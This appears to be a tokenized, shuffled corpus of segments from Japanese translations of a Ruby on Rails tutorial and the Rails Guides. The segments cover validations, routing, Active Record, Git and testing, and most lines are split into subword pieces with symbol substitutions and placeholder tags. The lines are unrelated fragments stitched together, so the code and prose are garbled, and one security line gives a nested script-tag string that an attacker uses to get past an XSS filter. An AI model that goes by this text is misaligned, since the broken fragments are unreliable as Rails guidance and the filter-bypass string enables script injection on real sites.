▁ これはリスト \ ref { code : final _ gemfile } で使用されていました 。
▁ 三項演算子 を使用すると 、 単純な if - the n ス テ ート メ ン ト を コンパクト に記述 することができます 。
▁`: xml ` オプション が指定されてい れば 、` render ` によって ` to _ xml ` が自動的に 呼び出される ようになっています 。
▁ここでは 、 ユーザ オブジェクトを 破 棄 しても 、\ k ode { microposts } 変数 は 空の 配列 \ k ode { [ ]} として 残 されている ことがわかります 。
▁Jan u ary から D e ce mb er まで の 月 を オプション に 持ち 、 現在の 月 が 選択 されている select タグを返します ( 訳 注 : ▁ 日本語 環境では 1 月 から 12 月 が表示されます ) 。
▁上のコードは 、 id = 1 の カテゴリ を検索し 、 関連付けられた すべての 記事 と その タグ や コメント 、 および すべての コメント の ゲ スト 関連付けを 一括読み込み します 。
▁ ちなみに 、 リスト \ ref { code : jquery _ file _ test } のような コード では 大 き すぎる ファイルの アップロード を 完全に は 阻 止 できない 、 という 点を 覚え て おいてください 。
▁上の 実行 結果 で使用されている 接続 情報 は 、` ENV [' DAT A BASE _ URL ']` の内容 と 一致し ています 。
▁{0} 図 1 ▖ 4 ▁{/0}{1} 新規 作成された Rails アプリケーションの ディレクトリ 構造 {/1}
▁User ▖ inactive
▁\ k ode { if } - \ k ode { else } 分 岐 を使用して コードを 書き 分 け ている 点が 少し 汚 い ですが 、 このコード の ク リ ー ン アップ は 演習 に 回 す ことにします ▁(\ ref { sec : micropost _ exercises }) 。
▁User プロフィール画面 に対するテスト
▁class ▁Create P ub li c ation s ▁< ▁ActiveRecord :: Migration
▁ このような サーバー は 通常 「 ステージング サーバー ( staging ▁server )」 と呼ばれ ます 。
▁@ user ▖ reload ▖ email ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼\ begin { code listing }╼\ label { code : downcase _ bang }╼\ code caption { A n ▁alter n ate ▁callback ▁implementation ▖ ▁\ passing ▁\ \ ▁\ file path { app / models / user ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 2 ] ╼\ begin { code } ╼ class ▁User ▁< ▁Application Record ╼ ▁before _ save ▁ { ▁email ▖ downcase ! ▁ } ╼ ▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁50 ▁ } ╼ ▁ VALID _ EMAIL _ REGEX ▁= ▁ / \ A [ \ w + \ - ▖ ] + @ [ a - z \ d \ - ▖ ] + \ ▖ [ a - z ] + \ z / i ╼ ▁validates ▁: email , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁2 55 ▁ }, ╼ ▁format : ▁ { ▁with : ▁ VALID _ EMAIL _ REGEX ▁ }, ╼ ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ } ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁uniqueness _ validation ▁( end )╼╼ ▁% ▁section ▁model _ validations ▁( end )╼╼ ▁\ section { セキュア な パスワード を追加する } ▁% ▁( fold )╼ ▁\ label { sec : adding _ a _ secure _ password }╼╼
▁たとえば ` 0 1 _ critical ▖ rb ` は 最初に 読み 込 まれ 、` 02 _ normal ▖ rb ` は 次に 読み込まれます 。
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 , ▁7 , ▁" foo ", ▁" bar "]
▁なお 、 「\ k ode { ! !} 」( 「 バ ン バ ン ▁( bang ▁ bang )」 と 読み ます ) ▁という 演算子 を使うと 、 そのオブジェクト を 2 回 否 定 すること になるので 、 どんな オブジェクト も 強制的に 論理値 に変換 できます 。
▁たとえば 以下の 場合 、
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / enumerable ▖ rb ` です
▁Help ページ ▁( リスト \ ref { code : custom _ help _ page }) ▁ や About ページ ▁( リスト \ ref { code : custom _ about _ page }) ▁ についても 、 同じ要領で リスト \ ref { code : help _ view _ full _ html } ▁ や ▁リスト \ ref { code : about _ view _ full _ html } のような コード に 変更します 。
▁| ▁`: two _ words _ connect or ` ▁| ▁` support ▖ array ▖ two _ words _ connect or ` ▁|
▁{0} 図 6 ▖3{/0}{1} \ href { http :// sqlite browser ▖ source for ge ▖ net /}{ SQLite ▁Database ▁B row s er } と 作成した \ k ode { users } テーブル \ href { http :// railstutorial ▖ org / images / figures / sqlite _ database _ browser - full ▖ png }{( 拡大 ) }{/1}
▁ このような ときは 、\ text tt { rails ▁destroy } コマンドを実行 するだけで 元に戻す ことができます 。
▁it h
▁リスト \ ref { code : real _ account _ activation _ test } の テストでは 、\ k ode { assert \_ match } メソッドを使用して 名前 、 有効化トークン 、 エスケープ 済み メールアドレスが メール 本 文 に含まれている かどうか をテストします 。
▁ past ?
▁リスト \ ref { code : nested _ hashes } に示したように 、 ハッシュ の値 には ほぼ 何 でも 使用する ことができ 、 他の ハッシュ を使用すること すら できます 。
▁Ruby を学ぶ ための 精 選 された オンライン リソース 一覧 は たくさん あります ので 、 そ の中から 以下 をご紹介します 。
▁` image _ tag ` は 、 特定の ファイル を指す HTML ▁`< img ▁/> ` タグ を生成します 。
▁client ▁= ▁Client ▖ find (10)
▁ バ ッ ク ト レ ー ス は 問題 を 追 跡 する うえで は非常に 便利な のですが 、 クラウド IDE など 一部の システム では 、 この ト レ ー ス が gem の 依存関係 や Rails 自身 に まで 及 ぶ ことがあります 。
▁resources ▁: photos
▁なお 、 演習 と チュートリアル 本 編 の 食 い 違い を 避ける 方法 については 、 演習 用の トピックブランチ に追加し た メ モ ▁(\ ref { sec : static _ pages _ exercises }) ▁ を 参考にしてください 。
▁これは 上の ` Date # advance ` で示した 例 で 適用 されます ▟ 相 対 的な 時間 の 計算 において も 計算 の順序 は 同様に 重要です 。
▁t ▖ belongs _ to ▁: supplier
▁* ▁Rails ▁4▖0 では コントローラで の ` dom _ id ` および ` dom _ class ` メソッド の使用 が 非推奨 になりました ▁( ビューで の使用 は 問題ありません ) 。
▁ ルート ルーティング で 「 ¡ H ol a , ▁ mundo !」 を表示する よう 変更 する 。
▁次の 段 階 の 準備 として 、 以下のコード を
▁上 で説明した 設計 や セキュリティ上の 考 慮 事 項 を元に 、 以下の 方 針 で 永続的セッション を作成する ことにします 。
▁Twitter には 、 マイクロポスト 入力 中に \ text tt {@ } 記 号 に 続けて ユーザーの ログイン 名 を入力する と そのユーザー に 返 信 できる 機能 があります 。
▁( この 比 較 の 公式 な 証 明 を \ ref { sec : expiration _ proof } に 付 録 として 追加 しました ) 。
▁<%= ▁stylesheet _ link _ tag ▁" main " ▁%>
▁この バリデーション は 、`: if ` 条件 がすべて ` true ` になり 、 かつ `: unless ` が 1 つ も ` true ` にならない 場合にのみ 実行されます 。
▁ ▖ ide a
▁ それ なら 攻撃者は 次に は 「 & lt ; s c r script ip t & gt ; 」 という文字 を入力する でしょう ▟ この 文字 が フィルタ される と 「 & lt ; script & gt ; 」 という文字 が 残 ってしまいます 。
▁以下は 最も よく 使用される メソッドの 一覧 です 。
▁この エラーメッセージ から 、「 StaticPages コントローラに \ k ode { about } アクション がない 」 という ことがわかります ▟ リスト \ ref { code : static _ pages _ controller } の \ k ode { home } や \ k ode { help } と同じように about アクション を追加します ▁( リスト \ ref { code : adding _ the _ about _ page }) 。
▁なお 、\ k ode { Time ▖ zone ▖ now } は Rails の 組み込み ヘルパー であり 、 サーバー の タイムゾーン に応じた タイムスタンプ を返します 。
▁このメソッドは 、` Array # un sh if t ` の別名 です 。
▁Action ▁View は 独立した パッケージ であり 、 どのような Ruby ライブラリ と でも 組み合わせ て 使用できます 。
▁この場合 の \ k ode { id } 属性 は単なる 整 数 ▁( すなわち \ k ode { self ▖ id } は ユーザーの id ) ▁ である ため 危 険 はありません が 、 SQL 文 に インクルード される 変数 を \ emph { 常に } エスケープ する 習慣 は ぜ ひ 身につけ てください 。
▁Rails は どの マイグレーション ファイルが データベースに コミット された か を 把 握 し ており 、 その 情報 を使用して ロールバック 機能 を提供 しています 。
▁` find _ each ` メソッドでは 、 通常の ` find ` メソッドと ほぼ 同じ オプション が 使用できます ▟ `: order ` と `: limit ` は ` find _ each ` 内部で 利用 するために 予 約 されており 、 使用できません 。
▁config ▖ middleware ▖ swap ▁ ActionController :: F a i l safe , ▁ Lifo :: F a i l safe
▁ 実装 の 途中 ですが 、 ここで ひとつ 補 足 します 。
▁ ユーザーログイン のテスト で使用する フィクスチャ
▁リスト \ ref { code : admin _ migration } では 、\ k ode { default : ▁false } という 引数 を \ k ode { add \_ column } に追加し ています ▟ これは 、 デフォルトでは 管理者 に \ emph { な れ ない } という ことを 示す ためです
▁ここまで でき れば 、 リスト \ ref { code : mail _ account _ activation } で定義した \ k ode {@ user } インスタンス変数 、 edit への 名前付きルート 、 ERB を 組み合わせ て 、 必要な リンク を作成 できます ▁( リスト \ ref { code : account _ activation _ view _ text } と リスト \ ref { code : account _ activation _ view _ html }) 。
▁ レシーバ が ハッシュ の配列 である場合 、 ルート 要素 はデフォルトで ` objects ` になります 。
▁` reverse _ order ` メソッドは 、 並び順 が指定されてい る 場合に 並び順 を 逆に します 。
▁ これはリスト \ ref { code : password _ reset _ integration _ test } で使用されていました 。
▁<%= ▁link _ to ▁" Blog ▁articles ", ▁articles _ path ▁%>
▁$ ▁git ▁ checkout ▁- b ▁my _ back port _ branch ▁ 3- 2 - s table
▁ これはリスト \ ref { code : hello _ root _ route } で使用されていました 。
▁### ▁ オブジェクト から パス と URL を作成する
▁ 上で 実行 した コマンド で示した ように 、 実は これらの 2 つの オプションを 1 つ に まとめて \ k ode { git ▁commit ▁- a m ▁" Message "} と 実行 することができます 。
▁=> ▁false
▁ 他 の別名 作成 メソッド と同様 、1 つ目の 引数に は 新しい 名前 、2 つ目の 引数に は 元の 名前 を指定します ▁( 変数 に 代入 するとき と同じ 順序 、 と 覚え ておく 手 もあります ) 。
▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁` re order ` を実行し なかった場合 に 実行される SQL は 以下のような もの になります 。
▁ cd ▁< ディレクトリ 名 >
▁### ▁ 定数
▁ う る う 年 の 2 月 2 9 日 の場合 、 昨 年 と 来 年 の 日付 は いずれも 2 月 28 日 になります 。
▁SSL を導入し たので 、 次は アプリケーションの 設定 を い じ って 、 本番環境 に 適 した Web サーバ を使って みましょう 。
▁### ▁ マ ス ク 済み 真 正 性 トークン
▁ おそらく 最も 基本的な バリデーション は 「\ emph { 存在性 ▁( P re s ence ) }」 です ▟ これは 単 に 、 与えられた 属性 が存在する こと を検証します 。
▁これらの コード により 、 ユーザープロファイル を表示し て 、 ページを 更新 せずに フォロー または フォロー解除 が できる ようになった はずです 。
▁# ▁' / assets ' のデフォルト
▁Article ▖ first ▖ cat eg or ies ▖ many ?
▁( Rails の ログ に エラー が出力されます が 、 害 は 生 じ ません ) 。
▁この リスト では 、\ ref { sec : partial s } の 「 パーシャル 」 の ところで も 使 った \ k ode { render } ▁ メソッド を再度 使い ま わ しています ▟\ k ode { render } ▁ は コントローラのアクション の中で も 正常に動作し ます 。
▁これにより 、 与えられた ▁ _ 主キー _ ▁ に マッチする レコード をすべて 含 む 配列 が返されます 。
▁ メールアドレス の 一意性 を強制する ために ▁( ユーザー名 として 使う ために ) 、\ k ode { validates } メソッドの \ k ode { : uniq ue } オプション を使います 。
▁</ tt > ▁is ▁true ,
▁ 多くの 場合 、 コードを 書き 進 め る うちに 肥 大 化 したり 繰り返し が 増え たり して 、 い つ しか 「 悪 臭 を 放 つ 」 醜 悪 な コード になり は て る ものです 。
▁ ヒント は 、 Message モデルと 、 新規 マイクロポスト に マッチする 正規表現 です 。
▁ アカウントを有効化する \ k ode { edit } アクション
▁TIP : ▁Active ▁Record の関連付け の詳細については 、[ Active ▁Record の関連付け ( ア ソ シ エ ー ション ) ]( association _ basic s ▖ html ) ガイド を参照してください 。
▁ 使用する プラグイン はすべて gem に 展開 して Gemfile に追加し なければなりません ▟
▁# ▁matter ▁the ▁context ▖
▁これで 、 レイアウト に {0}{1} 第 3 章 {/1}{/0} で作成した すべての 静的ページ へのリンク が で きました ▟ たとえば \ href { http ://0▖0▖0▖0:3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁ 圧縮 する ことによって も ファイル サイズ が 小 さ く なり 、 ブラウザ への 読み込み 時間 が 短縮 されます 。
▁( Factory ▁Girl は テスト 環境で しか 使用 し ないので 、 以下のように \ k ode { : test } グループ に追加します ) 。
▁Rails が 生成する デフォルトの scaffold によって 、 以下の CSS ルール が追加され ます 。
▁ 行 儀 の 悪 い Rails サーバー などの プロセス を kill する 際に は 、 上の ように ひとつ ずつ kill する ことをおすすめします ▟ Rails サーバー の p id を知る には 、\ text tt { p s ▁aux ▁| ▁ grep ▁server }) など と 実行 します ▟ しかし 時に は 特定の 名前を持つ プロセス を まとめて kill したい こともあります ▟ し つ こ い \ text tt { spring } プロセス た ち を ひとつ ずつ kill するのは 大 変 面倒 です 。
▁もし 多数の 静的なページ が必要になる 場合は 、\ href { https :// github ▖ com / thoughtbot / high _ v ol tag e }{\ text tt { high _ v ol tag e } } ▁gem ▁ を調べ てみてください 。
▁ — 「\ emph { F ound ers ▁at ▁Work } 」( J ess ic a ▁L i v ing st on 著 ) ▁ の P a ul ▁G ra ha m の 言葉 。
▁\ ref { sec : adding _ page _ title s } のテスト を実行して この 改 修 を 確 認 すれば 、 今 度 も ▁\ passing ▁ になるはずです 。
▁# ▁gem ▁' c api str a no ', ▁group : ▁: development
▁( ユーザーを削除 したら 、 ユーザーの リレーションシップ も 同時に 削除され る必要があります ▟ そのため 、 関連付け に \ k ode { dependent : ▁: destroy } も 追加 しています ▟)
▁Gravatar は 、 プロファイル 写 真 を アップロード するとき の 面倒な 作業 や 、 写 真 が 欠 け たり などの ト ラ ブ ル 、 置き場所 の 悩 み を 解決 します ▟ ユーザーの メールアドレスを 組み 込 んだ Gravatar 専 用の 画像 パス を構成する だけで 、 対応する Gravatar の 画像 が自動的に 表示されます
▁このメソッド 1 つ だけで セキュア な パスワード の実装 が ほとんど 終 わ っ てしまう ので 、 逆に この 機能を 一 から 手 作り するのは 簡 単 ではありません 。
▁( � 図 \ ref { fig : signup _ failure } の 下 部 に 見え ている のが Rails の \ emph { web ▁console } という 機能 です ▟ これは rails ▁console を ブラウザ 上で 開 け るように し 、 デバッグ を し やすくするため の 機能 です 。
▁=> ▁true
▁It ' s ▁an ▁empty ▁string !
▁\ k ode { rails } スクリプト は 、\ k ode { bundle ▁exec } なしで 動作する 設計 になっています 。
▁NOTE : ▁この 値は シンボル にする ことはできません 。
▁今度は 、\ emph { リポジトリ } を作成する たびに 必要な 作業 を行います 。
▁ ファイルの コピー
▁\ k ode { remember \_ digest } 属性 を追加した User モデル
▁ }╼╼\ section { Account ▁activation } ▁% ▁( fold )╼\ label { sec : account _ activation }╼╼
▁ クラウド IDE では 以下の 操作 を行います 。
▁Git の モデル は 、( 単 一 の パッチ ではなく ) ▁ 一連の パッチ として コミット されます ▟ そのため 、 コミットメッセージ を書く ときには 、 その コミット が 「 何 を した のか 」 と 過 去 形 の 履 歴 スタイル で 書く よりも 「 何 を \ emph { する }」 ための もの な のか を 現在 形 かつ 命 令 形で 書く 方が 、 後 から 見 返 したときに わかりやすく なります 。
▁Rails は 巨 大 プロジェクト であり 、 異 質 な コミット が 多数 加 わ ると 膨大な ノ イ ズ が生じ る可能性があります 。
▁<% ▁end ▁%>
▁# ▁ アセット のバージョン を指定する ▟ アセット をすべて 期限切れ に したい場合は この 値 を変更する 。
▁\ ref { sec : for getting _ users } のコード で 、 アプリケーションに プロ 仕 様 の 完全な 認証システム が 導 入 されました 。
▁ 前述の とおり 、` render ` は レスポンス 構成 時に どの ビュー ▁( または 他の アセット ) ▁ を使用する か を指定する ためのものです 。
▁> > ▁@ user ▁= ▁@ user ▁|| ▁" another ▁user "
▁#### ▁` has _ one ` の スコープ について
▁" comments _ count "▖ humanize ▁# ▁=> ▁" Comments ▁count "
▁リスト \ ref { code : relationships _ fixtures } の fixture では 、 前 半 の 2 つ で Michael が L an a と M all or y を フォロー し 、 後 半 の 2 つ で L an a と A r ch er が Michael を フォロー しています 。
▁Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態
▁resource ▁: geocoder
▁ 本 節 と 次の 節 では 、 セッション 機能 を作成する 準備 として 、 Session コントローラ 、 ログイン 用の フォーム 、 両者 に関連する コントローラのアクション を作成します 。
▁` duplicable ?` メソッドは 、 上の ハ ー ド コード された リスト に依存し ますが 、 その 代 わ り ` rescue ` より ずっと 高速 です 。
▁<%= ▁javascript _ include _ tag ▁" main ", ▁" columns " ▁%>
▁\ k ode { session } メソッドを使用すると 、 ユーザー ID を 安全 に ブラウザ に保存 して 一時 セッション を作成 できます 。
▁ マイクロポスト 作成 用の 新しい ファクトリー を含む 、 完全な Factory ファイル 。
▁< html >
▁たとえば 、 Rails によって 作成される ログ ファイルは 頻繁に 内容 が 変わる ので 、 い ち い ち バージョン管理 に 更新 させた く ありません 。
▁+ --- --- + - -------- + --- --- + --- --- +-------------+
▁NOTE : ▁ 返される のは ` optgroup ` タグ と ` option ` だけです ▟ 従って 、 出力結果 の 外 側 を 適切な ` select ` タグ で 囲 む 必要があります 。
▁上の Cucumber の コマンドを 、 下 の RSpec の コマンド と 比 較 してみてください 。
▁Web アプリケーションを 開発 用の P C で 実際に 動 か して この ことを 確かめ てみましょう 。
▁has _ many ▁: orders , ▁-> ▁ { ▁ extending ▁Find Re c ent E x t en s ion ▁ }
▁ この節 の内容は 必 須 ではありません ので 、 スキップ しても 問題ありません 。
▁この フィールド 用の ` attr _ accessor ` も 設定 する必要があります ▟ これにより 、 この フィールド 用の ゲ ッ ター と セッター が 定義 されます 。
▁次に 、 大 き すぎる ファイル サイズ に対して 警 告 を 出 す ために 、 ち ょ っ と した JavaScript ▁( 正確に は \ href { http :// jquery ▖ com /}{ jQuery }) ▁ を 書き 加 えます ▟ こうすることで 、 長 すぎる アップロード 時間 を 防 い だ り 、 サーバー への 負 荷 を 抑 え たり すること に 繋 が ります 。
▁\ k ode { hello _ app } ディレクトリ にある デフォルトの \ k ode { Gemfile } 。
▁\ k ode { user } に 紐 付 いて いて 、\ k ode { id } が \ k ode {1} である マイクロポスト を検索する
▁ マイクロポストを フィード できない
▁この とおり に できた 場合は 、 この節 の 残 り は スキップ してください 。
▁ アカウント有効化 メール の場合 ▁(\ ref { sec : account _ activation _ email s }) ▁ と同様 、 Rails の メール プレビュー 機能 で パスワード再設定の メールを プレビュー しましょう 。
▁# ▁app / mailers / user _ mailer ▖ rb
▁( システム 環境 によって は 、 ここで Rails を 再起動 させる 必要がある かもしれません ▟)
▁has _ many ▁: orders
▁1) ▁# ▁=> ▁ ArgumentError
▁このコードは リスト \ ref { code : signup _ errors _ updated } で使用されていました ▟ もうひとつ 、
▁この とおり に しない と 、 Ruby ライブラリ や Rails は ネイティブ データを た び た び UT F -8 に変換 し なければ な らず 、 しかも ときに 失敗する ことがあります ▟ 外部 データを 常に UT F -8 に しておくこと を ぜ ひ お勧め します 。
▁( このとき 、 Spring サーバー に 接続 できない などの エラーが表示され る ことがあります 。
▁### ▁最初の フォーム
▁上のルーティングは 、` / photos / show /1/ with _ user / 2 ` のような パス にマッチし ます ▟ ` with _ user ` の 部分 は 固定 されています 。
▁has _ many ▁: ph y s ic i an s , ▁through : ▁: appointment s
▁まずは 、 確認し やすい 無効な 場合 について や って みましょう ▟ ユーザー登録ページ の パス を ブラウザで 開 いて ボタン を クリック したら 、 ユーザー アカウント が 変更 \ emph { されない } という 動作 です 。
▁=> ▁- 1
▁</ p >
▁> I ▁like ▁the ▁way ▁you ' ve ▁re structure d ▁that ▁code ▁in ▁generate _ find er _ sql ▁- ▁much ▁nice r ▖ ▁( generate _ find er _ sql のコード が 非常に よい 形で 再 構 築 されている 点が よい と思います ) 。
▁File ▖ atomic _ write ( join ed _ asset _ path ) ▁do ▁| cache |
▁=> ▁" m z n p y b u j "
▁\ k ode { full _ title } ヘルパー を定義する
▁( スクリーンキャスト は 、 このような 一 からの 手 作り 開発 手順を 解説 するのに 向 い ています ▟ この 課題 を 十分 に 理解 したい 方は 「\ href { http :// www ▖ railstutorial ▖ org / screencasts } { Ruby ▁on ▁Rails ▁Tutorial ▁ screencasts } ▁( 英語 )」 を参照してください ) 。
▁where (" created _ at ▁< ▁? ", ▁time )
▁NOTE : ▁CoffeeScript を使用する には 、 E x ec JS が ランタイム で サポート されている 必要があります 。
▁続いて 、 メール での 通知 機能を オプション として 選択 可能 に し 、 不要な 場合は 通知 をオフに できるように してみましょう 。
▁ マイクロポスト 投 稿 フォームの パーシャル
▁次の 章 に進む前に 、 変更を master ブランチにマージ しておきましょう 。
▁``` css
▁第 1 章では 、 最初に 必要な ソフトウェア をインストール し 、 開発環境 ▁(\ ref { sec : up _ and _ running }) ▁ を 整 え て Ruby ▁on ▁Rails を 動 か す 準備 を します 。
▁# ▁=> ▁ NoMethodError : ▁undefined ▁method ▁` limit ' ▁for ▁#< Array : 0 x 0 07 f f 34 d 3 ad 6 d 8 >
▁上のコードは どこか で 見た こと があると 思 った ら 、 それ も その は ず 、 Capybara です ▟ Capybara はデフォルトで Cucumber の ステップ ファイルに 含 まれ ます 。
▁followers
▁ といった 行 があります が 、 これは 次の コード と 等 価 になります 。
▁### ▁` has _ many ▁: through ` 関連付け
▁<%= ▁link _ to ▁" Delete ▁article ", ▁@ article , ▁remote : ▁true , ▁method : ▁: delete ▁%>
▁ マイクロポストの コンテンツ が存在し ている かどうか のバリデーション コード
▁Rails は 、 あらゆる 開発者 が Web アプリケーションの 開発 を 始 め る うえで 必要となる 作業 や リソース を事前に 仮 定 して 準備 しておくこと で 、 Web アプリケーションを より 簡単に プログラミング できるように 設計 されています 。
▁ 開発環境 を あ れ これ 整 え 始 め ると 、「 すべての ツール を 自 在 に 使い こ な す には \ emph { かなり } 長い 時間 が か か り そう だ 」 と 実 感 する ことでしょう 。
▁scope ▁module : ▁' admin ' ▁do
▁ 新しい アプリケーションでは これが デフォルト になります 。
▁t ▖ integer ▁: supplier _ id
▁ 以下 に 例 を示します 。
▁date ▁= ▁ DateTime ▖ new (201 0, ▁6 , ▁7 , ▁ 19 , ▁ 55 , ▁ 25 )
▁( 上 記 の 2 行目 にある ▁' > ' ▁ という文字 は 、 改行 を 示す ために シェル が自動的に 挿入する 文字 です ▟ 手動で 入力 しないよう 、 注意してください ) ▁ 後 は いつものように マイグレーション を実行します 。
▁たとえば 、 患 者 ( patient ) が 医師 ( ph y s ic i an ) と の 診 察 予 約 ( appointment ) を 取 る 医療 業 務 を 考え て みます 。
▁Rails では リソース ルーティング を行なう 他 に 、 任意の URL を アクションに ルーティング することもできます 。
▁< ul ▁id =" users ">
▁ これはリスト \ ref { code : contact _ page _ test } で使用されていました 。
▁ 本 の中で 、 与えられた 言葉 ▁( 例えば 、 “ foobar ” ) ▁ が 出 て く る 箇所 をすべて 見つけ るために は 、 ページを 端 から 順に め く って 最 後 まで 探 す 必要があります 。
▁ 53 ▖ ordinal ▁# ▁=> ▁" r d "
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 27 : 50 ▁GMT
▁X 1 ▁= ▁: over r ide s _ X 1 _ a bo ve
▁Time ▖ utc ( 1582 , ▁10 , ▁3 ) ▁+ ▁5 ▖ day s
▁ これはリスト \ ref { code : users _ migration } で使用されていました 。
▁( 実は 、 この ソース から は \ emph { 信 頼 性 トークン ▁( authenticity ▁token ) ▁ } 関連の HTML を 除 外 して あります ▟ Rails は 、 ある 種 の \ emph { ク ロ ス サイト リクエスト 偽 造 } ▁( CSRF : ▁ cross - site ▁request ▁ forgery ) ▁ 攻 撃 に 対 抗 するために このような HTML を自動的に 追加します 。
▁ 画像 を リ サイズ するために 画像 アップ ロー ダ ー を修正する
▁ パスワード の 最 小文字 数 をテストする ▁( ▁\ failing ▁ )
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } : ▁最初に \ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts エ ピ ソ ー ド ア ー カ イ ブ } を開いて 、 目 に つ いた トピック を 適 当 に 開 く ところから始め てみると よいでしょう 。
▁create ▁app / controllers / static _ pages _ controller ▖ rb
▁\ k ode { Micropost } モデルを 以下のように 直接 使用 して \ k ode { correct _ user } フィルタ を実装する こともできます 。
▁ 生成された 行 が 多 過 ぎ る ▁ (200 行 を 超 え る ) ▁ 場合 、 コメント を呼び出し の 上 に置い てください 。
▁NOTE : ▁ エ ン コーディング の種類 を指定すると 、 Mail は コンテンツ が 既に エンコード 済み である と 判 断 し 、 Base 64 による エンコード を 行 いません 。
▁Author ▖ joins (: articles )▖ where ( articles : ▁ { ▁author : ▁author ▁ })
▁> > ▁Rails ▖ env ▖ development ?
▁Git による バージョン管理 を導入し 、 Bitbucket の 非 公開 リポジトリ に プッシュ する 理由は 、 データ の 喪 失 を 防止 し 、 他の 開発者 と の 共 同 作業を 行えるように する ため 。
▁上の 計算 は 、 以下の 実行 前 と 実行 後 の両方 で 行われます 。
▁password : ▁ com p any ▖ smtp _ password ,
▁(\ ref { sec : a _ controller _ class } でも 説明します が 、 コンソール から Rails 環境 にアクセス することもできます ) 。
▁これらの マイグレーション を アプリケーションに コピー するには 、 以下のコマンドを実行し ます 。
▁#### ▁ 範囲 条件
▁A ▁test ▁for ▁the ▁user ▁profile ▖ ▁ {2}{3}{/3}{3}{4} green {/4}{/3}{3}{/3} {/2}
▁JavaScript と 埋め込み Ruby を使って フォロー の関係 性 を作成する
▁{0} 第 {1} 2 {/1} 章 {/0} でも 指 摘 した とおり 、 主な 理由は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が成功した のか 失敗した のか が わかりにくい ためです 。
▁ パーシャル によって 、 Rails と Ruby には 、 Rails エラー オブジェクト 用の 2 つの メソッド を含む 多くの 成 果 物 が 導 入 されました 。
▁class ▁ Foo
▁ う れ しい ことに 、 Rails エンジン は Rails アプリケーション と 大 半 の 機能を 共有 している ので 、 これらは 完全に 実現 可能です 。
▁' some ▁class ▁method ▁string '
▁cookies の各 要素 は 、 それ 自体 が 2 つの 要素 ▁(\ k ode { value } と オプション の \ k ode { expire s } 日時 ) ▁ の ハッシュ になっています 。
▁user _ path (@ user ) ▁# ▁=> ▁"/ users / 3 57 - j o h n - s m i th "
▁create _ table ▁: articles ▁do ▁| t |
▁Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル
▁example \_ user で使用する コード
▁A ▁test ▁of ▁\ k ode { authenticated ?}
▁上 は フォームから送信 された パスワード です 。
▁` collection _ singular _ id s = ` メソッドは 、 指定された 主キー id を持つ オブジェクトの 集 まり で コレクション の内容を 置き換え ます ▟ 元 から あった オブジェクトは 削除 されます 。
▁\ ref { sec : a _ users _ resource } には 別の 例 もあります 。
▁Rails ▁4 では 、` config / routes ▖ rb ` で RESTful な リソース が 宣言 された ときに 、 更新 用の 主要な HTTP ▁verb として ` PATCH ` が 使用される ようになりました 。
▁ SELECT ▁D IS T IN C T ▁name ▁FROM ▁clients
▁ユーザー インデックス は と う と う 完了 しました ▟ 残 る は \ k ode { destroy } だけです ▟ これ を実装する ことで 、 REST に 準 拠 した 正 統 な アプリケーション となります 。
▁ alt 属性 が 明示的に 指定 されていない 場合は 、 ファイル名 が alt テキスト として 使用されます ▟ このとき ファイル名 の 先 頭 は 大文字 になり 、 拡張子 は 取り 除 か れ ます 。
▁ この動作 は 、` E n um er at or # each _ with _ object ` を使用して 下 位 の すべての オブジェクト に ` deep _ dup ` を 送信する の と似ています 。
▁ 表 \ ref { table : RESTful _ users } から 、 適切な リクエスト は それぞれ \ text tt { GET } と \ text tt { PATCH } である ことがわかります ▟ したがって 、 テスト 内で は \ k ode { get } メソッドと \ k ode { patch } メソッド を使います 。
▁class ▁ Document ▁< ▁ActiveRecord :: Base
▁# ▁ 保存 後に User Mailer を使用して welcome メールを送信
▁まずは 、 リスト \ ref { code : unsuccessful _ edit _ test } のテスト を参考に して 、 ユーザー情報 を更新する 正しい 振る舞い を テストで 定義 します ▁( 今回は 有効な 情報を 送信する ように 修正 します ) 。
▁` form _ for ` ヘルパーは 、 これを 見 て 何 の フォーム である か を知る ことができます 。
▁これ を行う 方法 の 1 つ は 、 Ruby の \ k ode { map } メソッドを使用することで す ▟ このメソッドは すべての ▁" 列 挙 可能 ▁( enumerable ) " ▁ オブジェクト ▁( 配列 や ハッシュ など 、 要素 の 集合 で 構成 される あらゆる オブジェクト { p 1 }) ▁ で 使用できます 。
▁# ▁=> ▁< link ▁ href ="/ assets / all ▖ css " ▁ media =" screen " ▁ rel =" stylesheet " ▁/>
▁ { p 0} でも 簡単に 説明しました が 、 上のコード の {2} Word ▁< ▁ String {/2} は 継 承 のための Ruby の 記 法 です ▟ こうすることで 、 新しい {2} palindrome ? {/2} メソッド だけ ではなく 、 String クラス で 使用できる すべての メソッドを Word クラス に対して も 使用 できるようになります 。
▁ 場合によっては ` has _ and _ belongs _ to _ many ` で使用される クエリ を カスタマイズしたくなること があります 。
▁\ ref { sec : account _ activations _ resource } のときと同様に テスト を生成し ないようにする フラグ を追加し 、 代わりに \ ref { sec : activation _ test _ and _ refactoring } の 統合テスト を生成する ようにします 。
▁{0} 図 9 ▖ 10 {/0} {1} ユーザーインデックスページ ▁\ href { http :// localhost :3000/ users }{/ users } での ページネーション ▟\ href { http :// railstutorial ▖ org / images / figures / user _ index _ pagination _ rails _ 3 _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁╼╼ ╼ ▁\ subsection { コンストラクタ } ▁% ▁( fold )╼ ▁\ label { sec : const ru c to rs }╼╼
